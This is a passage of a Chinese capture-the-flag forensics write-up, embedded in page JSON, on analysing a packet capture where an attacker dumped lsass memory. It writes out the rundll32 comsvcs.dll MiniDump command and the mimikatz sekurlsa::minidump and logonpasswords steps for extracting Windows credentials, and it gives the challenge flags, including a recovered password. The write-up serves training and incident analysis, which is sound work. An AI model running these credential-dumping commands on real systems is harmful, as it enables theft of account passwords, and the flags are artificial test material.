padding-left: 0px; padding-right: 0px;\">comsvcs.dll 是 Windows 系统中的一个 DLL 文件，包含与 COM+ 服务相关的功能。这个 DLL 文件中的 MiniDump 函数可以用来创建内存转储文件（memory dump），这些文件包含了系统内存的快照，可能包括敏感信息，如用户凭证</p> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">这条命令意思是：</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">使用 rundll32.exe 来调用 comsvcs.dll 库中的 MiniDump 函数。</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">MiniDump 函数将尝试对 PID（进程标识符）为 852 的进程进行内存转储。</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">转储的内存将被保存到 C:\\temp\\OnlineShopBackup.zip 文件中。</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">所以转储的应该是852端口的进程也就是lsass进程</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">flag{852}</p> \n<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">3、用户WIN101的密码是什么?</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">要获取密码，肯定要从日志中导出获取到的lsass，也就是这条命令：</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">rundll32.exe comsvcs.dll, MiniDump 852 C:\\temp\\OnlineShopBackup.zip full</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">OnlineShopBackup.zip这个文件，然后通过mimikatz进行解密获取密码</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">mimikatz导密码用法：</p> \n<pre class=\"custom\" data-tool=\"mdnice编辑器\" style=\"border-radius: 5px; box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px; text-align: left; margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px;\"><span style=\"display: block; background: url(https://files.mdnice.com/user/3441/876cad08-0422-409d-bb5a-08afec5da8ee.svg); height: 30px; width: 100%; background-size: 40px; background-repeat: no-repeat; background-color: #282c34; margin-bottom: -7px; border-radius: 5px; background-position: 10px 10px;\"></span><code class=\"hljs\" style=\"overflow-x: auto; padding: 16px; color: #abb2bf; padding-top: 15px; background: #282c34; border-radius: 5px; display: -webkit-box; font-family: Consolas, Monaco, Menlo, monospace; font-size: 12px;\"><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;将lsass&nbsp;&nbsp;dump下来</span><br>rundll32.exe&nbsp;comsvcs.dll,&nbsp;MiniDump&nbsp;852&nbsp;C:\\temp\\lsass.dmp&nbsp;full<br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;使用mimikatz读取dump下来的密码&nbsp;</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::minidump&nbsp;C:\\temp\\lsass.dmp</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::logonpasswords</span><br></code></pre> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">导出http数据包，因为是文件，根据经验导出最大的几个文件查看就行了</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/93e2f258-ca99-4165-acd0-408c49bc6a97.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/61a8f248-37a2-400e-8e8d-f06b60669654.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">dmp文件的特征之一就是文件较大，直接选47MB的查看，打开文件后也能看到dmp文件特征，对比常规dmp文件发现文件头多了e1c1709这几个字符，删除后文件恢复正常</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">如果没删除e1c1709字符直接mimikatz解密会报如下错误</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/bbb69088-d310-47a3-9886-550236897469.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">导出的product2.php</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/bc25d769-12e0-45da-b5fa-113cbc828a76.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">正常的lsass.dmp文件</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\"><img src=\"https://files.mdnice.com/user/73977/3f37fc15-6dd5-4466-8d12-156f2652f4e3.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%;\"> 将修改后的文件后缀改成dmp，放到mimikatz进行解密</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">记得用管理员用户打开mimikatz</p> \n<pre class=\"custom\" data-tool=\"mdnice编辑器\" style=\"border-radius: 5px; box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px; text-align: left; margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px;\"><span style=\"display: block; background: url(https://files.mdnice.com/user/3441/876cad08-0422-409d-bb5a-08afec5da8ee.svg); height: 30px; width: 100%; background-size: 40px; background-repeat: no-repeat; background-color: #282c34; margin-bottom: -7px; border-radius: 5px; background-position: 10px 10px;\"></span><code class=\"hljs\" style=\"overflow-x: auto; padding: 16px; color: #abb2bf; padding-top: 15px; background: #282c34; border-radius: 5px; display: -webkit-box; font-family: Consolas, Monaco, Menlo, monospace; font-size: 12px;\">mimikatz.exe<br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::minidump&nbsp;product2.dmp</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::logonpasswords</span><br></code></pre> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/fb52ffab-20cc-4c52-9c39-14dabd16156f.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">对NTLM的md5进行解密</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/08b2db87-bed2-4744-8ace-7a877220d224.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">flag{admin#123}</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/086fd9eb-c49b-4793-8616-ddef3fb0d47e.jpg\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure>",
                "title": "【玄机】第六章 流量特征分析-蚂蚁爱上树",
                "categoryId": 1,
                "categoryName": "后端",
                "tagId": 100,
                "tagName": "后端",
                "userId": 73977,
                "userOutId": "345717196179",
                "username": "蟑螂恶霸1",
                "avatar": "",
                "description": "01前置知识wireshark下载地址：https://wireshark.org更改中文配置编辑--首选项--外观--列自行增加源端口和目标端口配置将pcap文件导入wireshark，使用筛选功能",
                "level": 1,
                "publishTime": "2024/08/28",
                "readingNum": 4,
                "likeNum": 0,
                "introduction": null,
                "followWords": null,
                "followPic": null,
                "isFollowing": false,
                "isLike": false,
                "isSelf": false,
                "type": 1,
                "isVisible": true,
                "invisibleReason": null,
                "writingColumn": {
                    "columnOutId": "1a75aebb4f0b488a9c54db3040b44a5d",
                    "name": "默认专栏",
                    "briefIntro": "这是一个默认专栏",
                    "cover": "https://files.mdnice.com/common/community/default-column-cover.jpg",
                    "writingNum": 3,
                    "createTime": "2024-08-28 16:48"
                }
            }
        },
        "__N_SSP": true
    },
    "page": "/writing/[id]",
    "query": {
        "id": "756746fdb6a349c8b8b2b96323bbad9f"
    },
    "buildId": "ErZPkD4oq6iwH2nj6Dpcx",
    "isFallback": false,
    "gssp": true,
    "appGip": true
}